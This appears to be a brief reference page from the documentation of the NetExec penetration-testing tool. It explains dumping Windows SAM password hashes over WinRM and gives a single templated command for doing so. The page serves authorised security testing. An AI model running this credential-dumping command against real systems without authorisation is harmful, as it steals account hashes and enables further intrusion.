title: Dump SAM
html:
Dump SAM

Dump SAM hashes

Extracts and downloads SAM registry hive, and uses secretsdump.py methods locally to dump hashes

nxc winrm <CIDR> -u <USERNAME> -p <PASSWORD> --sam
